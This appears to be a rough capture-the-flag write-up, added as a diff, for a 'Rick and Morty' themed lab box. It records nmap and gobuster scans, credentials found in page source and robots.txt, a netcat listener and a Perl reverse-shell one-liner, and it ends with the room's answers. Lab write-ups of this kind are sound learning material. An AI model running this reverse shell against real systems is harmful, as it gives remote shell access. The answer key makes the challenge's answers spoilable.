@@ -1,0 +1,81 @@
+export ip:http://10.10.197.180/
+
+---
+nmap:
+nmap -sC -sV -T5 10.10.197.180
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d6:69:b5:1b:2d:de:3a:aa:8e:1f:36:f9:5a:ed:8a:93 (RSA)
+|   256 94:1a:98:22:1a:2c:6b:48:a0:da:5b:f2:6c:fe:9e:ff (ECDSA)
+|_  256 2b:7a:7f:30:e7:68:cb:9b:0e:1d:ff:3b:09:b3:31:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Rick is sup4r cool
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+-------
+Wiew the source code of 10.10.150.253/
+ ı found 
+<!--
+
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+
+  -->
+------------------------------
+gobuster:
+
+gobuster dir -u http://10.10.150.253/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,js,css,txt,conf -t 40  
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.150.253/
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              conf,php,html,js,css,txt
+[+] Timeout:                 10s
+===============================================================
+2022/08/21 13:22:08 Starting gobuster in directory enumeration mode
+===============================================================
+/login.php            (Status: 200) [Size: 882]
+/index.html           (Status: 200) [Size: 1062]
+/assets               (Status: 301) [Size: 315] [--> http://10.10.150.253/assets/]
+/portal.php           (Status: 302) [Size: 0] [--> /login.php]                    
+/robots.txt           (Status: 200) [Size: 17]     
+
+
+-------------------------------------------------
+
+View /robots.txt page and wiew source code
+
+possible password found : Wubbalubbadubdub
+
+go to /login.php page and trt to use  creditienals and access the command panel
+
+nc -nlvp 4545
+use this reverse shell and gain shell
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+-----------------
+QUESTIONS
+
+
+What is the first ingredient Rick needs?
+mr. meeseek hair
+
+
+Whats the second ingredient Rick needs?
+1 jerry tear
+
+Whats the final ingredient Rick needs?
+fleeb juice
+
+
+
